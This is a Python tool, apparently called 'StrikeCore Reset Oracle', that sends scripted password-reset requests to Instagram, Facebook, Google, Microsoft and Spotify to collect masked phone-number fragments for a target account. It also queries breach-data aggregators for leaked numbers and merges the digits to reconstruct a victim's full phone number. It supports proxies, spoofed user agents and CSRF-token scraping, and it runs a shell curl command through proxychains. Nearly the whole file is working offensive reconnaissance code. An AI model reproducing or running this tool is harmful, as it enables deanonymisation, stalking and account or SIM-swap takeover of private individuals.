#!/usr/bin/env python3
"""
StrikeCore Reset Oracle — Extract partial phone numbers from password reset flows.

Chains multiple services' forgot-password endpoints to extract partial phone
numbers. Each service reveals different digits. Cross-referencing 3+ partials
can reconstruct the full number.

Approach: pure HTTP requests, no browser needed for most services.
"""

import hashlib
import http.client
import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from dataclasses import dataclass, field

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))


@dataclass
class PhonePartial:
    """A partial phone number fragment from a password reset."""
    service: str
    raw_hint: str           # The raw masked string from the service
    country_code: str = ""  # e.g. "+39"
    last_digits: str = ""   # e.g. "47" (last 2 known)
    first_digits: str = ""  # e.g. "33" (first 2 after country code)
    middle_hint: str = ""   # any middle fragments
    full_mask: str = ""     # normalized: +39 3XX XXX XX47
    method: str = ""        # "sms" or "email" — how recovery was sent
    confidence: float = 0.0


@dataclass
class OracleResult:
    """Aggregated result from all reset oracles."""
    partials: list = field(default_factory=list)
    reconstructed: str = ""
    known_digits: dict = field(default_factory=dict)  # position -> digit
    carrier_hint: str = ""
    notes: list = field(default_factory=list)


def _ua():
    return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"


def _mobile_ua():
    return "Instagram 275.0.0.27.98 Android (26/8.0.0; 480dpi; 1080x1920; samsung; SM-G950F; dreamlte; samsungexynos8895; en_US; 211900014)"


def _run(cmd, timeout=15):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip()
    except:
        return ""


def _parse_masked_phone(raw):
    """Parse a masked phone like '+39 *** *** **47' into components."""
    # Clean up
    clean = raw.strip()
    
    # Extract country code
    cc_match = re.match(r'\+(\d{1,3})', clean)
    cc = cc_match.group(1) if cc_match else ""
    
    # Extract visible digits from end
    last_match = re.search(r'(\d{2,4})\s*$', clean)
    last = last_match.group(1) if last_match else ""
    
    # Extract visible digits from start (after country code)
    rest = clean
    if cc:
        rest = clean[len(cc)+1:].strip()
    first_match = re.match(r'(\d{1,3})', rest)
    first = first_match.group(1) if first_match else ""
    
    return cc, first, last


class ResetOracle:
    """Password Reset Oracle Chain — extracts phone partials from forgot-password flows."""

    def __init__(self, proxy=None):
        self.proxy = proxy
        self.result = OracleResult()
        self._session_cookies = {}

    def _request(self, url, data=None, headers=None, method="GET"):
        """Make an HTTP request, optionally through proxy."""
        hdrs = {"User-Agent": _ua()}
        if headers:
            hdrs.update(headers)
        
        if data and isinstance(data, dict):
            data = urllib.parse.urlencode(data).encode()
        elif data and isinstance(data, str):
            data = data.encode()
        
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        
        if self.proxy:
            proxy_handler = urllib.request.ProxyHandler({
                'http': self.proxy,
                'https': self.proxy,
            })
            opener = urllib.request.build_opener(proxy_handler)
        else:
            opener = urllib.request.build_opener()
        
        try:
            resp = opener.open(req, timeout=15)
            return resp.status, resp.read().decode(errors="ignore"), dict(resp.headers)
        except urllib.error.HTTPError as e:
            return e.code, e.read().decode(errors="ignore"), dict(e.headers)
        except Exception as e:
            return 0, str(e), {}

    # ═══════════════════════════════════════════════════════
    # Instagram Oracle
    # ═══════════════════════════════════════════════════════
    
    def oracle_instagram(self, username):
        """Instagram forgot password — reveals email or phone partial."""
        print(f"\n  [IG] Probing @{username}...")
        
        # Step 1: Get CSRF token
        status, body, headers = self._request("https://www.instagram.com/accounts/password/reset/")
        csrf = re.search(r'"csrf_token":"([^"]+)"', body)
        if not csrf:
            print(f"    FAIL: no CSRF token")
            return None
        
        token = csrf.group(1)
        time.sleep(1)
        
        # Step 2: Send reset request
        status, body, headers = self._request(
            "https://www.instagram.com/accounts/account_recovery_send_ajax/",
            data={"email_or_username": username, "recaptcha_challenge_field": ""},
            headers={
                "X-CSRFToken": token,
                "X-Requested-With": "XMLHttpRequest",
                "Referer": "https://www.instagram.com/accounts/password/reset/",
                "Cookie": f"csrftoken={token}",
                "Content-Type": "application/x-www-form-urlencoded",
            },
        )
        
        try:
            data = json.loads(body)
        except:
            print(f"    FAIL: invalid response")
            return None
        
        contact = data.get("contact_point", "")
        method = data.get("recovery_method", "")
        title = data.get("title", "")
        body_text = data.get("body", "")
        
        print(f"    Title: {title}")
        print(f"    Contact: {contact}")
        print(f"    Method: {method}")
        
        if "phone" in method.lower() or "sms" in method.lower():
            # Phone recovery — the contact_point contains masked phone
            partial = PhonePartial(
                service="Instagram",
                raw_hint=contact,
                method="sms",
                confidence=0.9,
            )
            cc, first, last = _parse_masked_phone(contact)
            partial.country_code = cc
            partial.first_digits = first
            partial.last_digits = last
            partial.full_mask = contact
            print(f"    *** PHONE PARTIAL: {contact} ***")
            print(f"    CC: +{cc}, First: {first}, Last: {last}")
            self.result.partials.append(partial)
            return partial
        else:
            # Email recovery — no phone info, but confirms email
            self.result.notes.append(f"IG: email recovery to {contact} (no phone linked or email is primary)")
            print(f"    INFO: email-based recovery ({contact}) — phone may not be linked")
            return None

    # ═══════════════════════════════════════════════════════
    # Facebook Oracle
    # ═══════════════════════════════════════════════════════
    
    def oracle_facebook(self, email=None, fb_id=None):
        """Facebook forgot password — can reveal partial phone."""
        identifier = email or fb_id
        print(f"\n  [FB] Probing {identifier}...")
        
        # Step 1: Identify account
        status, body, _ = self._request(
            "https://www.facebook.com/login/identify/?ctx=recover",
        )
        
        # Extract form tokens
        lsd = re.search(r'name="lsd" value="([^"]+)"', body)
        jazoest = re.search(r'name="jazoest" value="([^"]+)"', body)
        
        if not lsd:
            # Try mbasic
            status, body, _ = self._request("https://mbasic.facebook.com/login/identify/?ctx=recover")
            lsd = re.search(r'name="lsd" value="([^"]+)"', body)
            jazoest = re.search(r'name="jazoest" value="([^"]+)"', body)
        
        if not lsd:
            print(f"    FAIL: cannot get form tokens")
            return None
        
        time.sleep(1)
        
        # Step 2: Submit identifier
        form_data = {
            "lsd": lsd.group(1),
            "email": identifier,
        }
        if jazoest:
            form_data["jazoest"] = jazoest.group(1)
        
        status, body, headers = self._request(
            "https://mbasic.facebook.com/login/identify/?ctx=recover",
            data=form_data,
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://mbasic.facebook.com/login/identify/",
            },
        )
        
        # Look for phone partial in the response
        # Facebook shows: "Send code via SMS to +39 *** *** **XX"
        phone_patterns = [
            r'(\+\d{1,3}\s*\*[\d\*\s\-]+\d{2,4})',  # +39 *** ** 47
            r'(\d{1,3}\s*\*[\d\*\s\-]+\d{2,4})',      # 39 **** 47
            r'ending in (\d{2,4})',                     # "ending in 47"
            r'finisce con (\d{2,4})',                   # Italian
            r'termina.{0,10}(\d{2,4})',
            r'(\*+\d{2,4})',                            # ****47
        ]
        
        for pat in phone_patterns:
            match = re.search(pat, body)
            if match:
                raw = match.group(1)
                partial = PhonePartial(
                    service="Facebook",
                    raw_hint=raw,
                    method="sms",
                    confidence=0.85,
                )
                cc, first, last = _parse_masked_phone(raw)
                partial.country_code = cc
                partial.first_digits = first
                partial.last_digits = last
                partial.full_mask = raw
                print(f"    *** PHONE PARTIAL: {raw} ***")
                self.result.partials.append(partial)
                return partial
        
        # Check if email-only recovery
        if "email" in body.lower() and "sms" not in body.lower():
            self.result.notes.append("FB: only email recovery available (no phone?)")
            print(f"    INFO: email-only recovery")
        else:
            # Save raw for manual inspection
            # Look for any recovery options listing
            options = re.findall(r'(?:Send|Invia)[^<]{0,100}(?:SMS|sms|phone|telefono)[^<]{0,50}', body)
            if options:
                print(f"    Recovery options found: {options[:3]}")
            else:
                print(f"    No phone partial found in response")
        
        return None

    # ═══════════════════════════════════════════════════════
    # Google Oracle
    # ═══════════════════════════════════════════════════════
    
    def oracle_google(self, email):
        """Google account recovery — reveals partial phone in challenge."""
        print(f"\n  [GOOGLE] Probing {email}...")
        
        # Google recovery is JS-heavy but the API endpoint can be probed
        cmd = f'proxychains4 -q curl -sL "https://accounts.google.com/signin/v2/challenge/selection?flowName=GlifWebSignIn&Email={urllib.parse.quote(email)}" -H "User-Agent: {_ua()}" 2>/dev/null'
        raw = _run(cmd, 15)
        
        if not raw:
            print(f"    FAIL: no response")
            return None
        
        # Google masks phone as: "** ** ** 47" or "+39 *** *** **47"
        phone_patterns = [
            r'(\+\d{1,3}[\s\*\-]+\d{2,4})',
            r'(\*+\s*\*+\s*\*+\s*\d{2,4})',
            r'(\*{2,}\s*\d{2,4})',
            r'ending in (\d{2,4})',
            r'che termina con (\d{2,4})',
        ]
        
        for pat in phone_patterns:
            match = re.search(pat, raw)
            if match:
                raw_hint = match.group(1) if match.lastindex else match.group(0)
                partial = PhonePartial(
                    service="Google",
                    raw_hint=raw_hint,
                    method="sms",
                    confidence=0.8,
                )
                cc, first, last = _parse_masked_phone(raw_hint)
                partial.country_code = cc
                partial.last_digits = last
                partial.full_mask = raw_hint
                print(f"    *** PHONE PARTIAL: {raw_hint} ***")
                self.result.partials.append(partial)
                return partial
        
        # Check for phone number hint in JSON data
        json_phone = re.findall(r'"phoneNumber"[^}]*"obfuscatedPhoneNumber":"([^"]+)"', raw)
        if json_phone:
            print(f"    *** PHONE PARTIAL (JSON): {json_phone[0]} ***")
            partial = PhonePartial(service="Google", raw_hint=json_phone[0], method="sms", confidence=0.85)
            cc, first, last = _parse_masked_phone(json_phone[0])
            partial.country_code = cc
            partial.last_digits = last
            self.result.partials.append(partial)
            return partial
        
        self.result.notes.append(f"Google: no phone partial for {email}")
        print(f"    No phone partial found")
        return None

    # ═══════════════════════════════════════════════════════
    # Microsoft Oracle
    # ═══════════════════════════════════════════════════════
    
    def oracle_microsoft(self, email):
        """Microsoft/Office365 password reset — reveals partial phone."""
        print(f"\n  [MS] Probing {email}...")
        
        # Step 1: Get flow token
        status, body, _ = self._request(
            f"https://login.microsoftonline.com/common/oauth2/authorize?client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&login_hint={urllib.parse.quote(email)}",
        )
        
        # Look for sFT (flow token) and config
        sft = re.search(r'"sFT":"([^"]+)"', body)
        config_match = re.search(r'Config=(\{[^;]+\})', body)
        
        if not sft:
            print(f"    FAIL: no flow token")
            return None
        
        time.sleep(1)
        
        # Step 2: Request password reset
        status, body, _ = self._request(
            "https://login.microsoftonline.com/common/GetCredentialType",
            data=json.dumps({
                "username": email,
                "isOtherIdpSupported": True,
                "checkPhones": True,
                "isRemoteNGCSupported": True,
                "isCookieBannerShown": False,
                "isFidoSupported": True,
                "flowToken": sft.group(1),
            }),
            headers={"Content-Type": "application/json"},
        )
        
        try:
            data = json.loads(body)
        except:
            print(f"    FAIL: invalid response")
            return None
        
        # Check for phone hints in credential type response
        cred_type = data.get("Credentials", {})
        has_phone = data.get("HasPhone", False)
        
        if has_phone:
            print(f"    Has phone: True")
        
        # Look deeper in the response
        phone_hints = re.findall(r'(\+\d{1,3}[\s\*\-]+\d{2,4}|\*+\d{2,4})', json.dumps(data))
        if phone_hints:
            raw_hint = phone_hints[0]
            partial = PhonePartial(
                service="Microsoft",
                raw_hint=raw_hint,
                method="sms",
                confidence=0.8,
            )
            cc, first, last = _parse_masked_phone(raw_hint)
            partial.country_code = cc
            partial.last_digits = last
            print(f"    *** PHONE PARTIAL: {raw_hint} ***")
            self.result.partials.append(partial)
            return partial
        
        self.result.notes.append(f"MS: HasPhone={has_phone}, no partial revealed")
        print(f"    HasPhone: {has_phone}, no partial in response")
        return None

    # ═══════════════════════════════════════════════════════
    # Spotify Oracle
    # ═══════════════════════════════════════════════════════
    
    def oracle_spotify(self, email):
        """Spotify password reset."""
        print(f"\n  [SPOTIFY] Probing {email}...")
        
        status, body, _ = self._request(
            "https://accounts.spotify.com/en/password-reset",
        )
        
        csrf = re.search(r'csrf_token["\s:=]+([a-zA-Z0-9_-]+)', body)
        if not csrf:
            csrf = re.search(r'name="csrf_token" value="([^"]+)"', body)
        
        if not csrf:
            print(f"    FAIL: no CSRF")
            return None
        
        time.sleep(1)
        
        status, body, _ = self._request(
            "https://accounts.spotify.com/en/password-reset",
            data={
                "email_or_username": email,
                "csrf_token": csrf.group(1),
            },
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "Referer": "https://accounts.spotify.com/en/password-reset",
            },
        )
        
        # Spotify shows "We've sent a link to ****5@gmail.com" or phone partial
        phone_hints = re.findall(r'(\+\d{1,3}[\s\*\-]+\d{2,4}|\*+\d{2,4})', body)
        if phone_hints:
            print(f"    *** PHONE PARTIAL: {phone_hints[0]} ***")
            partial = PhonePartial(service="Spotify", raw_hint=phone_hints[0], method="sms", confidence=0.7)
            self.result.partials.append(partial)
            return partial
        
        email_hints = re.findall(r'[a-z\*]+@[a-z.]+', body)
        if email_hints:
            self.result.notes.append(f"Spotify: email-based recovery ({email_hints[0]})")
            print(f"    Email recovery: {email_hints[0]}")
        else:
            print(f"    No useful info in response")
        return None

    # ═══════════════════════════════════════════════════════
    # Breach DB Oracle (Dehashed/SnusBase via web)
    # ═══════════════════════════════════════════════════════
    
    def oracle_breach_db(self, email=None, fb_id=None):
        """Check breach aggregator services for phone number."""
        print(f"\n  [BREACH-DB] Checking aggregators...")
        
        targets = []
        if email:
            targets.append(("email", email))
        if fb_id:
            targets.append(("fbid", fb_id))
        
        found_phones = []
        
        for ttype, target in targets:
            # Try free LeakCheck
            print(f"    LeakCheck ({ttype}: {target})... ", end="", flush=True)
            try:
                status, body, _ = self._request(
                    f"https://leakcheck.io/api/public?check={urllib.parse.quote(target)}",
                    headers={"User-Agent": _ua()},
                )
                if "phone" in body.lower():
                    phones = re.findall(r'(\+?\d{10,15})', body)
                    for p in phones:
                        found_phones.append(p)
                        print(f"PHONE: {p}")
                else:
                    print("no phone data")
            except:
                print("error")
            
            time.sleep(2)
            
            # Try free IntelX preview
            print(f"    IntelX ({ttype}: {target})... ", end="", flush=True)
            try:
                status, body, _ = self._request(
                    f"https://2.intelx.io/phonebook/search",
                    data=json.dumps({
                        "term": target,
                        "buckets": [],
                        "lookuplevel": 0,
                        "maxresults": 10,
                        "timeout": 5,
                        "media": 0,
                    }),
                    headers={"Content-Type": "application/json"},
                )
                if body and "id" in body:
                    data = json.loads(body)
                    search_id = data.get("id", "")
                    if search_id:
                        time.sleep(2)
                        status2, body2, _ = self._request(
                            f"https://2.intelx.io/phonebook/search/result?id={search_id}&limit=10",
                        )
                        phones = re.findall(r'(\+39\d{9,10})', body2)
                        for p in phones:
                            found_phones.append(p)
                            print(f"PHONE: {p}")
                        if not phones:
                            print("no phone in results")
                    else:
                        print("no search ID")
                else:
                    print("no data")
            except:
                print("error")
            
            time.sleep(1)
        
        for phone in found_phones:
            partial = PhonePartial(
                service="BreachDB",
                raw_hint=phone,
                full_mask=phone,
                method="breach",
                confidence=0.95,
            )
            # If full number found, extract all digits
            digits = re.sub(r'\D', '', phone)
            if len(digits) >= 10:
                partial.last_digits = digits[-4:]
                partial.first_digits = digits[2:5] if digits.startswith("39") else digits[:3]
                partial.country_code = "39"
            self.result.partials.append(partial)
        
        return found_phones

    # ═══════════════════════════════════════════════════════
    # Aggregation
    # ═══════════════════════════════════════════════════════
    
    def reconstruct(self):
        """Try to reconstruct the full phone number from partials."""
        if not self.result.partials:
            return ""
        
        # Collect known digit positions
        # Italian mobile: +39 3XX XXX XXXX (10 digits after +39)
        known = {}  # position (0-9) -> digit
        
        for p in self.result.partials:
            if p.last_digits:
                # Last N digits
                for i, d in enumerate(reversed(p.last_digits)):
                    pos = 9 - i
                    if d.isdigit():
                        known[pos] = d
            
            if p.first_digits:
                # First digits (after country code)
                for i, d in enumerate(p.first_digits):
                    if d.isdigit():
                        known[i] = d
            
            # If full number in breach
            if p.full_mask and not '*' in p.full_mask:
                digits = re.sub(r'\D', '', p.full_mask)
                if digits.startswith("39"):
                    digits = digits[2:]
                if len(digits) == 10:
                    for i, d in enumerate(digits):
                        known[i] = d
        
        self.result.known_digits = known
        
        # Try to reconstruct
        if len(known) >= 10:
            number = "+39" + "".join(known.get(i, "?") for i in range(10))
            self.result.reconstructed = number
            return number
        elif len(known) >= 4:
            number = "+39 " + "".join(known.get(i, "*") for i in range(10))
            self.result.reconstructed = number
            return number
        
        return ""

    def report(self):
        """Print the oracle report."""
        print(f"\n{'='*60}")
        print(f"  RESET ORACLE REPORT")
        print(f"{'='*60}")
        
        print(f"\n  Partials collected: {len(self.result.partials)}")
        for p in self.result.partials:
            print(f"    [{p.service}] {p.raw_hint} (method: {p.method}, conf: {p.confidence:.0%})")
            if p.last_digits:
                print(f"      Last digits: {p.last_digits}")
            if p.first_digits:
                print(f"      First digits: {p.first_digits}")
        
        print(f"\n  Known digit positions: {len(self.result.known_digits)}/10")
        if self.result.known_digits:
            display = "".join(self.result.known_digits.get(i, "_") for i in range(10))
            print(f"    +39 {display[:3]} {display[3:6]} {display[6:]}")
        
        if self.result.reconstructed:
            print(f"\n  *** RECONSTRUCTED: {self.result.reconstructed} ***")
        
        if self.result.notes:
            print(f"\n  Notes:")
            for n in self.result.notes:
                print(f"    - {n}")
        
        print(f"{'='*60}")
        return self.result
